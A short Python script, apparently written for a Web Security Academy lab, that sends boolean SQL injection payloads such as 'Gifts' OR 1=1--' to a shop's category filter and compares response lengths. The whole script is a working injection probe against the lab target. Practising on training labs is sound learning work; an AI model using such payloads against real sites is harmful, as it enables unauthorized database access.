import requests

url = "https://0a69000304bdd93180bb17b000dc006f.web-security-academy.net/filter"

payloads = [
    "Gifts",
    "Gifts' AND 1=2--",
    "Gifts' OR 1=1--"
]

for payload in payloads:
    params = {"category": payload}
    
    res = requests.get(url, params=params)
    
    print(f"[Payload] {payload}")
    print(f"Length: {len(res.text)}")
    print("-" * 40)